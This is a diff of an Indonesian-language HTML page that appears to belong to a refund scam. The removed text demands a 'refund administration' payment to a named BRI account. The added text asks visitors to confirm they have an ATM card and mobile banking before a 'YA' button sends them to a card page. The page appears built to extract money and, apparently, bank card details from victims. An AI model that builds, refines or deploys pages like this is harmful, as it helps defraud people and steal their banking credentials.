@@ -22,13 +22,11 @@
     }
     .container {
       display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-wrap: wrap;
     }
     .option-button {
       padding: 10px 42px;
-      margin: 10px;
+      margin-right: 60px;
+      margin-left: 20px;
       background-color: #ff0000;
       color: #ffffff;
       border: none;
@@ -36,21 +34,19 @@
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
-    .option-button:disabled {
-      background-color: #cccccc;
-      cursor: not-allowed;
+    .option-button:first-child {
+      margin-left: 10px;
+      margin-right: 60px;
     }
   </style>
 </head>
 <body>
-  <p class="right-align Black-text">Konfirmasi Administrasi </p>
-  <p class="right-align Black-text">Silahkan Selesaikan Pembayaran Administrasi Refund </p>
-  <p class="right-align Black-text">Bank BRI No Rek 10352081244537393 A/n TRI USAHA BERKAT</p><br>
+  <p class="right-align Black-text">Pastikan Sudah Ada Kartu ATM </p>
+  <p class="right-align Black-text">Pastikan Sudah Terdaftar Mobile Banking </p><br>
 
   <div class="container">
-    <button id="unggah-foto" class="option-button">Unggah Bukti</button>
-    <button id="tidak-btn" class="option-button" disabled>TIDAK</button>
-    <a id="ya-btn" href="kartu.html" class="option-button" disabled>YA</a>
+    <button id="tidak-btn" class="option-button">TIDAK</button>
+    <a id="ya-btn" href="kartu.html" class="option-button">YA</a>
   </div>
 
   <script>
@@ -70,16 +66,6 @@
 
     // Panggil fungsi cekFotoDiunggah saat dokumen dimuat
     document.addEventListener("DOMContentLoaded", cekFotoDiunggah);
-
-    // Tambahkan event listener untuk tombol unggah foto
-    document.getElementById("unggah-foto").addEventListener("click", function() {
-      // Di sini Anda dapat menambahkan logika untuk membuka dialog unggah foto
-      // Misalnya, munculkan dialog unggah foto atau tautan ke halaman unggah foto
-      alert("Anda akan diarahkan untuk mengunggah foto.");
-      
-      // Setelah foto diunggah, aktifkan tombol "YA"
-      document.getElementById("ya-btn").removeAttribute("disabled");
-    });
   </script>
 </body>
 </html>
